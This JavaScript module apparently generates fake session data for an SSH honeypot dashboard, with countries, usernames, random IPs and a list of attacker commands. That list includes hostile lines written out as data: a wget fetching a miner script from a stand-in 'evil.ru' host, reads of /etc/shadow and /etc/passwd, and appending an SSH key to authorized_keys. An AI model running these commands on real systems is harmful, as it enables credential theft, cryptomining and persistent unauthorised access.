export const COUNTRIES = [
  {code:'CN', name:'China', flag:'🇨🇳', lat:35, lng:105, count:482},
  {code:'RU', name:'Russia', flag:'🇷🇺', lat:60, lng:90, count:341},
  {code:'US', name:'United States', flag:'🇺🇸', lat:38, lng:-97, count:218},
  {code:'DE', name:'Germany', flag:'🇩🇪', lat:51, lng:10, count:187},
  {code:'NL', name:'Netherlands', flag:'🇳🇱', lat:52, lng:5, count:156},
  {code:'BR', name:'Brazil', flag:'🇧🇷', lat:-14, lng:-51, count:143},
  {code:'IN', name:'India', flag:'🇮🇳', lat:20, lng:77, count:129},
  {code:'UA', name:'Ukraine', flag:'🇺🇦', lat:49, lng:32, count:112},
  {code:'KR', name:'South Korea', flag:'🇰🇷', lat:36, lng:128, count:98},
  {code:'FR', name:'France', flag:'🇫🇷', lat:46, lng:2, count:87},
  {code:'SG', name:'Singapore', flag:'🇸🇬', lat:1, lng:104, count:74},
  {code:'TR', name:'Turkey', flag:'🇹🇷', lat:39, lng:35, count:63},
];

export const USERNAMES = ['root','admin','ubuntu','pi','oracle','git','user','test','postgres','mysql','apache'];

export const COMMANDS = [
  'ls -la', 'whoami', 'id', 'cat /etc/passwd', 'uname -a', 'ps aux', 'netstat -tulpn',
  'wget http://evil.ru/miner.sh', 'curl ifconfig.me', 'history', 'cat /etc/shadow',
  'find / -perm -4000', 'crontab -l', 'cat ~/.ssh/authorized_keys',
  'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys'
];

export const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
export const randChoice = (arr) => arr[Math.floor(Math.random() * arr.length)];
export const randIP = () => `${randInt(1,255)}.${randInt(0,255)}.${randInt(0,255)}.${randInt(1,254)}`;

export const generateSessions = (count = 40) => {
  return Array.from({length: count}, (_, i) => {
    const country = randChoice(COUNTRIES);
    const dur = randInt(10, 3600);
    return {
      id: `BP-${String(2847 - i).padStart(5,'0')}`,
      ip: randIP(),
      country: country,
      username: randChoice(USERNAMES),
      start: new Date(Date.now() - randInt(0, 86400000)).toISOString().slice(11,19),
      duration: dur,
      commands: randInt(2, 47),
      status: Math.random() > 0.3 ? 'ENDED' : 'ACTIVE',
      cmdList: Array.from({length: randInt(3,8)}, () => randChoice(COMMANDS))
    };
  });
};
